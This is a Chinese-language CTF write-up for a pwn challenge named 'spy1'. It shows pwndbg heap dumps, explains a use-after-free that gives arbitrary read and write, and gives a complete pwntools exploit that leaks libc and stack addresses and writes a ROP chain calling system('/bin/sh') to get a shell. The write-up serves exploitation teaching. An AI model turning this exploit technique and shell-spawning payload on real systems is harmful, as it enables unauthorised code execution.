<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7ce4e00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7ce4e00</span> ◂— <span class="number">0x4a9685c83a3acd9</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7ce4e08</span> ◂— <span class="number">0x388dcda5fbac62a3</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7ce4e10</span> ◂— <span class="number">0xd3ed9d1013491f7a</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用于管理 ID</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7ce5e00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7ce5e00</span> —▸ <span class="number">0x7ffff7cd1fa0</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7ce5e08</span> —▸ <span class="number">0x7ffff7cd1f60</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7ce5e10</span> —▸ <span class="number">0x7ffff7cd1f40</span> ◂— <span class="number">0x400000001</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用于管理 Name</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7ccde90</span><span class="number">-0x50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7ccde40</span> ◂— <span class="number">0x8b</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7ccde48</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7ccde50</span> —▸ <span class="number">0x7ffff7cd3ed0</span> —▸ <span class="number">0x7ffff7cd4dc0</span> ◂— <span class="number">0x7a</span> <span class="comment">/* &#x27;z&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff7ccde58</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffff7ccde60</span> ◂— <span class="number">0x10000008b</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffff7ccde68</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffff7ccde70</span> —▸ <span class="number">0x7ffff7cd3f00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffff7ccde78</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7ffff7ccde80</span> ◂— <span class="number">0x1a00000004</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7ffff7ccde88</span> ◂— <span class="number">0x30</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7ffff7ccde90</span> —▸ <span class="number">0x7ffff7ce5e00</span> —▸ <span class="number">0x7ffff7cd1fa0</span> ◂— <span class="number">0x400000001</span> <span class="comment">/* addr_nameList */</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7ffff7ccde98</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7ffff7ccdea0</span> ◂— <span class="number">0x1a0000001a</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7ffff7ccdea8</span> ◂— <span class="number">0x30</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7ffff7ccdeb0</span> —▸ <span class="number">0x7ffff7ce4e00</span> ◂— <span class="number">0x4a9685c83a3acd9</span> <span class="comment">/* addr_idList */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7ffff7ccdeb8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7ffff7ccdec0</span> ◂— <span class="number">0x8b</span></span><br></pre></td></tr></table></figure>
<ul>
<li>用于管理整个程序</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序会调用类似于 realloc 的程序来申请存储 ID 的 chunk，利用这一点可以使该 chunk 被释放</p>
<p>但存储在栈中的 chunk 并不会更新，仍然使用原来的 chunk，这就造成了 UAF</p>
<p>泄露 heap_base 的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> = add(<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    add(<span class="built_in">chr</span>(i+<span class="number">0x30</span>)*<span class="number">4</span>)</span><br><span class="line">spy(<span class="built_in">id</span>)</span><br><span class="line">add(<span class="string">b&quot;yhw&quot;</span>)</span><br><span class="line">show_spy()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;ID: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x20dd0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>程序提供了修改 store chunk 的功能，利用这一点可以修改 free chunk list，从而申请到几乎任意地址的 chunk</p>
<p>接下来就可以尝试覆盖程序用于管理 ID 和 Name 的结构体，进而引发逻辑错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7ccde90</span><span class="number">-0x50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7ccde40</span> ◂— <span class="number">0x8b</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7ccde48</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7ccde50</span> —▸ <span class="number">0x7ffff7cd3ed0</span> —▸ <span class="number">0x7ffff7cd4dc0</span> ◂— <span class="number">0x7a</span> <span class="comment">/* &#x27;z&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff7ccde58</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffff7ccde60</span> ◂— <span class="number">0x10000008b</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffff7ccde68</span> ◂— <span class="number">0x400000001</span> <span class="comment">/* spy_key */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffff7ccde70</span> —▸ <span class="number">0x7ffff7cd3f00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffff7ccde78</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7ffff7ccde80</span> ◂— <span class="number">0x1a00000004</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7ffff7ccde88</span> ◂— <span class="number">0x30</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7ffff7ccde90</span> —▸ <span class="number">0x7ffff7ce5e00</span> —▸ <span class="number">0x7ffff7cd1fa0</span> ◂— <span class="number">0x400000001</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7ffff7ccde98</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7ffff7ccdea0</span> ◂— <span class="number">0x1a0000001a</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7ffff7ccdea8</span> ◂— <span class="number">0x30</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7ffff7ccdeb0</span> —▸ <span class="number">0x7ffff7ce4e00</span> ◂— <span class="number">0x95c818ca05833371</span> <span class="comment">/* addr_idList */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>核心点就是覆盖 <code>addr_idList</code>，将 <code>0x7ffff7ce4e00</code> 覆盖为 <code>0x7ffff7ccdeb0</code> 使其指向自身（后面会分析为什么）</li>
<li>其次就是覆盖 <code>spy_key</code> 为 <code>0x400000000</code>，不然会导致 edit store chunk 段错误（目前不知道原因）</li>
</ul>
<p>当我们完成以上两点覆盖后，就可以执行如下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spy(<span class="number">0x7ffff7ccdeb0</span>) <span class="comment"># spy(addr_idList)</span></span><br><span class="line">edit_spy(address)</span><br><span class="line">show()</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>0x7ffff7ccdeb0</code> 指向自身，执行 <code>spy(0x7ffff7ccdeb0)</code> 后，此时程序会同时将 <code>0x7ffff7ccdeb0</code> 给当成 <code>idList</code> 和 <code>id</code>，并将 <code>addr_id(0x7ffff7ccdeb0)</code> 存储到栈上</li>
<li>执行 <code>edit_spy(address)</code> 时会往 <code>0x7ffff7ccdeb0</code> 中写入 <code>address</code></li>
<li>执行 <code>show</code> 时就会将 <code>*(address)</code> 打印出来</li>
</ul>
<p>构建 WAA 和 RAA 的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">spy(addr_idList)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAA</span>(<span class="params">address</span>):</span></span><br><span class="line">    edit_spy(address)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">&quot;ID: &quot;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WAA</span>(<span class="params">address, values</span>):</span></span><br><span class="line">    edit_spy(address - <span class="number">0x10</span>) </span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> values:</span><br><span class="line">        <span class="built_in">id</span> = add(<span class="string">b&quot;A&quot;</span>)</span><br><span class="line">        spy(<span class="built_in">id</span>)</span><br><span class="line">        edit_spy(value)</span><br></pre></td></tr></table></figure>
<p>最后利用 WAA 劫持栈地址，写一个 <code>system(&quot;/bin/sh&quot;)</code> 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./spy1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x847C0)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;person:&quot;</span>,name)</span><br><span class="line">    ru(<span class="string">&quot;ID: &quot;</span>)</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,name</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;ID: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spy</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;suspect:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_spy</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;ID:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_spy</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = add(<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    add(<span class="built_in">chr</span>(i+<span class="number">0x30</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">spy(<span class="built_in">id</span>)</span><br><span class="line">add(<span class="string">b&quot;yhw&quot;</span>)</span><br><span class="line">show_spy()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;ID: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x20dd0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">addr_nameList = heap_base + <span class="number">0xbe90</span></span><br><span class="line">addr_idList = heap_base + <span class="number">0xbe90</span>+<span class="number">0x20</span></span><br><span class="line">addr_nameList_buf = heap_base + <span class="number">0x23e00</span></span><br><span class="line">addr_idList_buf = heap_base + <span class="number">0x22e00</span></span><br><span class="line">success(<span class="string">&quot;addr_nameList &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(addr_nameList))</span><br><span class="line">success(<span class="string">&quot;addr_idList &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(addr_idList))</span><br><span class="line">success(<span class="string">&quot;addr_nameList_buf &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(addr_nameList_buf))</span><br><span class="line">success(<span class="string">&quot;addr_idList_buf &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(addr_idList_buf))</span><br><span class="line"></span><br><span class="line">edit_spy(addr_nameList - <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p64(<span class="number">0x8b</span>)</span><br><span class="line">payload += p64(<span class="number">0x400000001</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x11ed0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x10000008b</span>)</span><br><span class="line">payload += p64(<span class="number">0x400000000</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x11f00</span>)</span><br><span class="line"><span class="comment"># name_list</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x1a00000004</span>)      <span class="comment"># type / size</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>)            <span class="comment"># capacity</span></span><br><span class="line">payload += p64(addr_nameList_buf) <span class="comment"># buffer</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># id_list</span></span><br><span class="line">payload += p64(<span class="number">0x1a0000001a</span>)    <span class="comment"># type / size</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>)             <span class="comment"># capacity</span></span><br><span class="line">payload += p64(addr_idList) <span class="comment"># buffer --&gt; pointerof(idList.@buffer)</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># save heap state</span></span><br><span class="line">payload += p64(<span class="number">0x8b</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x30000008b</span>)+p64(<span class="number">0x400000000</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x11f30</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xc0</span> - <span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">add(payload)</span><br><span class="line">add(payload)</span><br><span class="line">spy(addr_idList)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAA</span>(<span class="params">address</span>):</span></span><br><span class="line">    edit_spy(address)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">&quot;ID: &quot;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WAA</span>(<span class="params">address, values</span>):</span></span><br><span class="line">    edit_spy(address-<span class="number">0xc8</span>-<span class="number">0x10</span>) </span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> values:</span><br><span class="line">        <span class="built_in">id</span> = add(<span class="string">b&quot;A&quot;</span>)</span><br><span class="line">        spy(<span class="built_in">id</span>)</span><br><span class="line">        edit_spy(value)</span><br><span class="line"></span><br><span class="line">true_heap_addr = heap_base + <span class="number">0x13f90</span></span><br><span class="line">true_heap_base = RAA(true_heap_addr) - <span class="number">0x3580</span></span><br><span class="line">success(<span class="string">&quot;true_heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(true_heap_base))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = true_heap_base + <span class="number">0x35c0</span></span><br><span class="line">leak_addr = RAA(libc_addr)</span><br><span class="line">libc_base = leak_addr - <span class="number">0x424310</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack_libc = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stack_addr = RAA(stack_libc) - <span class="number">0x120</span></span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Name: AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">WAA(stack_addr, [</span><br><span class="line">    (libc_base + <span class="number">0x0000000000029139</span>),</span><br><span class="line">    (libc_base + <span class="number">0x000000000002a3e5</span>),</span><br><span class="line">    (libc_base + <span class="number">0x1d8698</span>),</span><br><span class="line">    (libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
